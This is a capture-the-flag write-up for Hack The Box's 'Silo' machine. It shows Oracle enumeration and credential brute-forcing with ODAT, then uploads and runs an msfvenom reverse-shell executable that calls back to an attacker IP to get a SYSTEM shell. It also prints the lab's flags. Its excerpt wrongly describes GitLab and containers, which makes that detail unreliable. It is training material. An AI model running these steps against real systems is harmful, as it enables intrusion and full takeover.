---
layout: single
title: Silo - Hack The Box
excerpt: "A vulnerable instance of Gitlab to obtain a shell. Mount the host filesystem within the container to access the root flag" 
date: 2022-09-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-silo/silo_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - ODAT
  - Oracle
---

![](/assets/images/htb-writeup-silo/silo_logo.png)

We need to upload a file and execute it to gain a privileged shell.

## Portscan
```bash
❯ nmap -sCV -p80,135,139,445,1521,5985,8080,47001,49152,49153,49154,49155,49159,49160,49161,49162 10.129.95.188 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:45 CEST
Nmap scan report for 10.129.95.188
Host is up (0.047s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http         Oracle XML DB Enterprise Edition httpd
|_http-server-header: Oracle XML DB/Oracle Database
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=XDB
|_http-title: 400 Bad Request
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.0.2:
|_    Message signing enabled but not required
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-time:
|   date: 2022-09-23T12:47:15
|_  start_date: 2022-09-23T12:08:02
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
```
After some tests...
```bash
❯ whatweb http://10.129.95.188:80
ERROR Opening: http://10.129.95.188:80 - execution expired
❯ curl -s -X GET http://10.129.95.188:80
❯ rpcclient -U "" 10.129.95.188 -N
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
❯ smbclient -L //10.129.95.188 -N
do_connect: Connection to 10.129.95.188 failed (Error NT_STATUS_IO_TIMEOUT)
❯ crackmapexec smb 10.129.95.188
SMB         10.129.95.188   445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
❯ smbmap -H 10.129.95.188
[!] Authentication error on 10.129.95.188
❯ smbmap -H 10.129.95.188 -u 'null'
[!] Authentication error on 10.129.95.188
```
Oracle Database calls our attention. We could solve this machine using [ODAT](https://github.com/quentinhardy/odat) or manually
1. ODAT
>  1. Installation
```bash
git clone https://github.com/quentinhardy/odat
cd odat/
git submodule init
git submodule update
sudo apt-get install libaio1 python3-dev alien python3-pip
```
Get instant client basic, sdk(devel) and sqlplus from the Oracle web site
```bash
❯ ls
oracle-instantclient-basic-21.7.0.0.0-1.el8.x86_64.rpm
oracle-instantclient-devel-21.7.0.0.0-1.el8.x86_64.rpm
oracle-instantclient-sqlplus-21.7.0.0.0-1.el8.x86_64.rpm
❯ sudo alien --to-deb *
❯ sudo dpkg -i *.deb
```
We add these variables in our zshrc checking the correct version. How? 
```bash
❯ ls /usr/lib/oracle
21
```
In my case is 21, so the final result in my zshrc will be: 
```bash
export ORACLE_HOME=/usr/lib/oracle/21/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
```
Last step:
```bash
❯ pip3 install cx_Oracle
```  
This will be enough to use the tool.
```bash
❯ python3 odat.py --help
```
> 2. Sidguesser
```bash
❯ python3 odat.py sidguesser -s 10.129.95.188
[1] (10.129.95.188:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server
[+] 'XE' is a valid SID
```
> 3. Passwordguesser.
```bash
❯ head -n 3 accounts/accounts.txt
abm/abm
adams/wood
adldemo/adldemo
```
By default, ODAT is using accounts/accounts.txt as dictionary. But we will use other with the correct format that it supports.
```bash
❯ locate oracle_ | grep pass
/usr/share/metasploit-framework/data/wordlists/hci_oracle_passwords.csv
/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
```
Change the format
```bash
❯ cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/' > ourNewDictionary.txt
```
Let's utilize our custom dictionary
```bash
❯ python3 odat.py passwordguesser -s 10.129.95.188  -d XE --accounts-file ourNewDictionary.txt
[+] Valid credentials found: scott/tiger. Continue...
100% |##################################################################| Time: 00:32:37
[+] Accounts found on 10.129.95.188:1521/sid:XE:
scott/tiger
```
Are this valid credentials?
```bash
❯ crackmapexec smb 10.129.95.188 -u 'scott' -p 'tiger'
SMB         10.129.95.188   445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
SMB         10.129.95.188   445    SILO             [-] SILO\scott:tiger STATUS_LOGON_FAILURE
```
> 4. It seems that is not working. Let's continue with odat and the utlfile option to test if we are able to see the /etc/hosts on the Windows machine
```bash
❯ python3 odat.py utlfile -s 10.129.95.188 -d 'XE' -U 'scott' -P 'tiger' --getFile 'C:\Windows\System32\drivers\etc\' 'hosts' 'hosts' --sysdba
[1] (10.129.95.188:1521): Read the hosts file stored in C:\Windows\System32\drivers\etc\ on the 10.129.95.188 server
[+] Data stored in the hosts file sored in C:\Windows\System32\drivers\etc\ (copied in hosts locally):
b"# Copyright (c) 1993-2009 Microsoft Corp.\n#\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n#\n# This file contains the mappings of IP addresses to host names. Each\n# entry should be kept on an individual line. The IP address should\n# be placed in the first column followed by the corresponding host name.\n# The IP address and the host name should be separated by at least one\n# space.\n#\n# Additionally, comments (such as these) may be inserted on individual\n# lines or following the machine name denoted by a '#' symbol.\n#\n# For example:\n#\n#      102.54.94.97     rhino.acme.com          # source server\n#       38.25.63.10     x.acme.com              # x client host\n\n# localhost name resolution is handled within DNS itself.\n#\t127.0.0.1       localhost\n#\t::1             localhost\n"
```
It works. We want to establish a reverse shell with netcat. In order to be able to carry it out, we need to create a payload and upload it into the victim machine.
```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.87 LPORT=4126 -f exe -o badshell.exe
```
```bash
❯ python3 odat.py utlfile -s 10.129.95.188 -d 'XE' -U 'scott' -P 'tiger' --putFile 'C:\Windows\Temp\' 'shell.exe' 'badshell.exe' --sysdba
[1] (10.129.95.188:1521): Put the badshell.exe local file in the C:\Windows\Temp\ folder like shell.exe on the 10.129.95.188 server
[+] The badshell.exe file was created on the C:\Windows\Temp\ directory on the 10.129.95.188 server like the shell.exe file
```
It would only be necessary to execute it.
```bash
❯ python3 odat.py externaltable -s 10.129.95.188 -d 'XE' -U 'scott' -P 'tiger' --exec 'C:\Windows\Temp\' 'shell.exe' --sysdba
[1] (10.129.95.188:1521): Execute the shell.exe command stored in the C:\Windows\Temp\ path
```
In our machine,
```bash
❯ rlwrap nc -lvnp 4126
listening on [any] 4126 ...
connect to [10.10.14.87] from (UNKNOWN) [10.129.95.188] 49178
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
nt authority\system
```
***

User flag: b2397834bc61db5f4662b02f2b61abec

Root flag: e0bd696617d563b54bbe214080d25cc2
